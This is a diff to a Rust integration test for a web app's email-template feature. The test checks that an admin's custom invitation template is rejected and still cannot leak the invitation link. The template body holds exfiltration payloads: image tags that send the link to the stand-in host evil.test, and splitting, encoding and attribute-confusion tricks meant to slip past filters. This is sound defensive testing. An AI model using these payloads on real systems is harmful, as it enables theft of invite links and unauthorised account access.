@@ -298,23 +298,34 @@ async fn a_custom_invitation_template_cannot_leak_the_link(pool: PgPool) {
     let h = harness(pool).await;
     let (ws, owner) = h.app.workspace_with_owner("acme").await;
     // An admin's template tries to get the link into the stored copy, or
-    // off to another site.
+    // off to another site. Saving it is refused; one saved before that
+    // check (inserted here directly) still cannot carry the link.
+    let body = "<p><a href=\"{{ invitation.url }}\">Join</a></p>\
+                <p>{{ invitation.url[:20] }}<!---->{{ invitation.url[20:] }}</p>\
+                <p>{{ invitation.url | urlencode }} {{ invitation.url | reverse }}</p>\
+                <img src=\"https://evil.test/?u={{ invitation.url }}\">\
+                <img src=\"https://evil.test/?v=>{{ invitation.url }}\">\
+                <img src='https://evil.test/?w= href=\"{{ invitation.url }}'>";
     h.app
         .post("/api/v1/templates")
         .signed_in(&owner)
         .json(json!({
             "kind": "email", "key": "system.invitation", "name": "Invitation",
-            "subject": "Join {{ invitation.url }}",
-            "body": "<p><a href=\"{{ invitation.url }}\">Join</a></p>\
-                     <p>{{ invitation.url[:20] }}<!---->{{ invitation.url[20:] }}</p>\
-                     <p>{{ invitation.url | urlencode }} {{ invitation.url | reverse }}</p>\
-                     <img src=\"https://evil.test/?u={{ invitation.url }}\">\
-                     <img src=\"https://evil.test/?v=>{{ invitation.url }}\">\
-                     <img src='https://evil.test/?w= href=\"{{ invitation.url }}'>"
+            "subject": "Join {{ invitation.url }}", "body": body,
         }))
         .send()
         .await
-        .ok();
+        .expect(axum::http::StatusCode::BAD_REQUEST, "invalid_input");
+    sqlx::query(
+        "INSERT INTO templates (id, workspace_id, kind, key, locale, name, subject, body)
+         VALUES (gen_random_uuid(), $1, 'email', 'system.invitation', 'en', 'Invitation', $2, $3)",
+    )
+    .bind(ws.0)
+    .bind("Join {{ invitation.url }}")
+    .bind(body)
+    .execute(&h.app.owner)
+    .await
+    .unwrap();
     h.app
         .post("/api/v1/invitations")
         .signed_in(&owner)
